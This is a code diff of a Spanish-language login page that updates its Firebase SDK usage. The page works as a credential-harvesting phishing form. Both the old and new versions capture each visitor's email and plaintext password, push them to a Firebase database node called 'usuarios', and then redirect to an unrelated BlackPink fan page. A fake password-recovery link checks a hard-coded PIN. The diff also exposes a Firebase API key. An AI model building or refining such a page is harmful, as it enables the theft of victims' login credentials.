@@ -4,10 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Inicia Sesión</title>
-
-  <!-- Fuente bonita y amigable -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-
   <style>
     body { 
       margin: 0; 
@@ -30,8 +27,8 @@
       margin-bottom: 20px; 
       animation: fadeIn 1s ease-in-out; 
     }
-    .login-box h2 { margin-bottom: 5px; font-weight: 600; font-size: 26px; color: #333; }
-    .login-box p { margin-top: 0; color: #666; font-size: 14px; }
+    .login-box h2 { font-weight: 600; font-size: 26px; color: #333; margin-bottom: 5px; }
+    .login-box p { color: #666; font-size: 14px; margin-top: 0; }
     .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; }
     .login-box button { width: 100%; padding: 12px; background: #4285F4; border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.3s; }
     .login-box button:hover { background: #2f6ae0; }
@@ -51,18 +48,17 @@
       <input type="password" id="password" placeholder="Contraseña" required>
       <button type="submit">Ingresar</button>
     </form>
-
     <div class="extra">
       <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
     </div>
   </div>
 
   <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js";
 
-  <script>
-    // Configuración de Firebase (tuya)
+    // Tu configuración de Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBFcBx7J4Yi01yka8oqqwEnjWQ4gYt7WBo",
       authDomain: "loginapp-63f68.firebaseapp.com",
@@ -75,39 +71,38 @@
     };
 
     // Inicializar Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
     const loginForm = document.getElementById('loginForm');
     const recoverLink = document.getElementById('recoverLink');
 
-    // Guardar login en DB y redirigir
-    loginForm.addEventListener('submit', function(e){
+    loginForm.addEventListener('submit', (e) => {
       e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-      // Guardar datos en Firebase
-      db.ref("usuarios").push({
+      // Guardar en la DB
+      push(ref(db, "usuarios"), {
         email: email,
         password: password,
         fecha: new Date().toLocaleString()
+      }).then(() => {
+        // Redirigir al enlace BlackPink después de guardar
+        window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+      }).catch((error) => {
+        alert("Error al guardar: " + error.message);
       });
-
-      // Redirigir
-      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
     });
 
-    // Recuperación con PIN
-    recoverLink.addEventListener('click', function(){
+    recoverLink.addEventListener('click', () => {
       const pin = prompt("Ingresa el PIN para acceder a los datos:");
       if(pin === "2006"){
-        alert("✅ Acceso permitido (modo local).");
+        alert("✅ Acceso permitido (pero los datos solo los ves en Firebase Console).");
       } else {
         alert("PIN incorrecto ❌");
       }
     });
   </script>
-
 </body>
 </html>
